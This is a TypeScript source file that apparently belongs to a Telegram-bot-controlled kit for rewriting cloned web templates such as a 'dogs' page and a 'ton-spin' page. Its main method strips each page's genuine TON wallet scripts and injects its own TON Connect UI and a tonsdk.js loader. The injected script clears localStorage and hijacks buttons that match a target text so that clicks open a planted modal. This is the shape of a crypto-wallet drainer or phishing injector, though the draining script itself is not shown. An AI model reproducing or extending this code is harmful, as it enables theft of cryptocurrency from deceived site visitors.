import {getDefaultBotConfig} from "@/bot/classes/CustomTelegraf";
import Path from "path";
import {promises as fs, existsSync} from "fs";
import {JSDOM} from "jsdom";
import {generateRandomString} from "@backend/utils/string";

export class WebTemplate {
	static async getTemplateList() {
		const {custom_templates = []} = getDefaultBotConfig();

		const staticTemplate: typeof custom_templates = []

		const cwd = process.cwd();
		const templateFolder = 'public';
		const metaFile = 'metadata.json'

		const path = Path.join(cwd, templateFolder);
		for (let folder of await fs.readdir(path)) {
			const folderPath = Path.join(path, folder);
			const stat = await fs.stat(folderPath);

			if (!stat.isDirectory()) continue;

			const metaPath = Path.join(folderPath, metaFile);
			if (!existsSync(metaPath)) continue;

			const content = (await fs.readFile(metaPath)).toString('utf-8');
			try {
				const metadata = JSON.parse(content);

				staticTemplate.push({
					url: `/${folder}/${metadata.main || "index.html"}`,
					name: metadata.name || folder
				});
			} catch (e) {
				console.error(`Json metadata parse error[${metaPath}]`, e);
			}
		}

		return [
			...staticTemplate,
			...custom_templates
		].filter(o => !!o.url);
	}

	static async configTemplateIndex(publicPath: string, targetText: string[], meta: Record<string, string> = {}) {
		const path = Path.join(process.cwd(), `public`, publicPath);
		if (!existsSync(path)) throw (`${path} doesn't exists!`);

		const indexContent = (await fs.readFile(path)).toString('utf-8');

		const jsdom = new JSDOM(indexContent);
		const document = jsdom.window.document;

		const scripts = document.querySelectorAll("script[src]");
		for (let script of Array.from(scripts) as HTMLScriptElement[]) {
			const illegals = [
				'tonconnect-ui.min',
				'tonsdk'
			]

			for (let illegal of illegals) {
				if (script.src.includes(illegal)) {
					script.parentNode?.removeChild(script);
				}
			}
		}

		function findsByText(text: string | string[], tag = '*'): Element[] {
			if (tag === '*') {
				const test = findsByText(text, 'button');
				if (test) return test;
			}

			const elements = document.querySelectorAll(tag);

			const arr = [];
			for (const element of Array.from(elements)) {
				const eText = element.textContent?.trim().toLowerCase().replaceAll(" ", "");

				for (const str of Array.isArray(text) ? text : [text]) {
					if (eText === str.toLowerCase().replaceAll(" ", "")) {
						arr.push(element);
					}
				}
			}

			if (!arr.length && tag === 'button') return findsByText(text, 'a')
			return arr;
		}

		function scInit(url: string) {
			const sc = document.createElement('script');
			sc.src = url;
			return sc;
		}


		const ton: HTMLScriptElement = document.querySelector("#tonUI") || scInit("/template-assets/tonconnect-ui.min.js?new");
		ton.defer = true;
		ton.id = "tonUI";
		document.head.prepend(ton);

		ton.setAttribute('onload', 'onTonLoad()');

		const gen = "target_" + generateRandomString(10);
		let uniqId = '';

		let matchElements = findsByText(targetText);

		for (let element of matchElements) {
			const previous = element.getAttribute('template-unique-id');
			if (previous) {
				uniqId = previous + "";
			} else {


				element.classList.add(gen);
				element.setAttribute('template-unique-id', gen);
				uniqId = gen;
			}

		}

		const initializerId = "template-ui-initializer";
		let sc = document.querySelector("#" + initializerId) || document.createElement('script');

		sc.innerHTML = `
window.localStorage.clear();
const uniqId = "${uniqId}";

const textQuery = ${JSON.stringify(targetText)};
function findsByText(text, tag = '*', editable = true) {
    const elements = document.querySelectorAll(tag);

    const arr = [];
    for (const element of Array.from(elements)) {
        const eText = element.textContent?.trim().toLowerCase().replaceAll(" ","");

	   for (const str of Array.isArray(text) ? text:[text]) {
        	if (eText === str.toLowerCase().replaceAll(" ", "")) {
		   arr.push(element);
		}
	   }
    }
    
    return arr;
}

async function handleUiInteract(n = 0) {
try {
	let _elements = [
            ...document.querySelectorAll("."+(uniqId || "unknownIHJ50pzWT2RZLU0Hcx8h")),
            ...findsByText(textQuery)
     ];
	const elements = Array.from(_elements);

    for (let element of elements) {
        if (element.hasAttribute('override-registered')) continue;

        const c = element.cloneNode(true);

        c.setAttribute('onclick', 'window.openModalUi()');

        c.addEventListener('click', e => {
            e.preventDefault();
            e.stopPropagation();
            window.openModalUi();
        })

        
        element.parentNode.replaceChild(c,element);
        console.log("Target on click set!", element);
        c.setAttribute("override-registered", 'true');
    }

    await new Promise(r => setTimeout(r,200 + (n/2)));
}catch (e){console.error(e)}
    return handleUiInteract(n+1);
}

function onTonLoad() {
	console.log("TON UI LOADED");
	const urls = [
		"/dogs/index_files/tonsdk.js?"+Date.now(),
		"/ton-spin/files/sweetalert2.min.js"
	];
	
	for (let url of urls) {
		const sc = document.createElement("script");
		sc.src = url;
		document.body.append(sc);
	}
}

handleUiInteract();
window.addEventListener('load', handleUiInteract)`;
		sc.id = initializerId;
		document.head.prepend(sc);

		const alertStyle = document.createElement("link");
		alertStyle.rel = 'stylesheet';
		alertStyle.href= "/ton-spin/files/sweetalert2.min.css";
		document.head.append(alertStyle);


		await fs.writeFile(path, jsdom.serialize());
	}
}
